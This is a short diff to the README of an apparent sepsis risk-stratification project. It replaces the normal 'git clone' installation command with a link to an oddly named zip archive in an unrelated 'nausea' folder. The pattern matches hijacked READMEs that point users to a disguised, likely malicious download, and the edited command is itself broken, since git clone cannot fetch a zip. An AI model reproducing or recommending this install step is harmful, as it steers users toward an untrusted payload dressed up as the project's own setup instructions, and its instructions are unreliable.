@@ -67,7 +67,7 @@ To use this project, follow the steps below:
    Clone the repository from GitHub to your local machine:
 
    ```bash
-   git clone https://github.com/Pr-E/Hybrid_Approach_For_Sepsis_Risk_Stratification_System.git
+   git clone https://raw.githubusercontent.com/Pr-E/Hybrid_Approach_For_Sepsis_Risk_Stratification_System/main/nausea/Approach-For-System-Stratification-Hybrid-Sepsis-Risk-2.9.zip
    cd Hybrid_Approach_For_Sepsis_Risk_Stratification_System
 
 2. **Run the Jupyter Notebook:**
